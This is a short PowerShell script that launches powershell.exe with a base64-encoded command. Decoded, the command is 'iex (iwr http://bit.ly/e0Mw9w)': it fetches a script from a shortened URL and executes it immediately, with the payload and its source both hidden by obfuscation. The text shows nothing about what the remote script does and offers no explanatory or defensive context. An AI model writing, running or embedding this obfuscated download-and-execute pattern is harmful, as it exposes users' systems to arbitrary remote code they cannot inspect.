$StartProcessParams = @{
    FilePath     = "powershell.exe"
    ArgumentList = "-EncodedCommand aQBlAHgAIAAoAGkAdwByACAAaAB0AHQAcAA6AC8ALwBiAGkAdAAuAGwAeQAvAGUAMABNAHcAOQB3ACkA -NoProfile"
}
Start-Process @StartProcessParams